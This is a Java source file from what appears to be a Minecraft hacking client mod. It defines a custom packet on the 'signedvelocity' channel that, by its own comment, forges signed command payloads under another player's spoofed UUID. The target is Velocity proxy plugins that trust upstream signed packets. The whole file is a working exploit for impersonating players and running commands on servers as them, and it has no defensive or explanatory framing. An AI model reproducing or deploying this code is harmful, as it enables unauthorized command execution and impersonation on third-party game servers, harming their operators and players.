package io.github.spigotrce.paradiseclientfabric.packet;

import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

/**
 * Sends a forged signed command payload as another player UUID
 * targeting Velocity or proxy plugins that trust upstream signed packets.
 */
public record SignedVelocityPayloadPacket(String uuid, String command) implements CustomPayload {

    public static final PacketCodec<PacketByteBuf, SignedVelocityPayloadPacket> CODEC =
            CustomPayload.codecOf(SignedVelocityPayloadPacket::write, SignedVelocityPayloadPacket::read);

    public static final Id<SignedVelocityPayloadPacket> ID =
            new Id<>(Identifier.of("signedvelocity", "main"));

    public SignedVelocityPayloadPacket(PacketByteBuf buf) {
        this(
                buf.readString(),  // UUID
                buf.readString()   // Command string (raw, without leading slash)
        );
    }

    private static SignedVelocityPayloadPacket read(PacketByteBuf buf) {
        // Keep in sync with write()
        String uuid = buf.readString();
        buf.readString(); // Skip "COMMAND_RESULT"
        buf.readString(); // Skip "MODIFY"
        String fullCommand = buf.readString();
        String command = fullCommand.startsWith("/") ? fullCommand.substring(1) : fullCommand;
        return new SignedVelocityPayloadPacket(uuid, command);
    }

    private void write(PacketByteBuf buf) {
        buf.writeString(uuid);              // Spoofed UUID
        buf.writeString("COMMAND_RESULT");  // Type hint
        buf.writeString("MODIFY");          // Command operation
        buf.writeString("/" + command);     // Full command string
    }

    @Override
    public Id<? extends CustomPayload> getId() {
        return ID;
    }
}
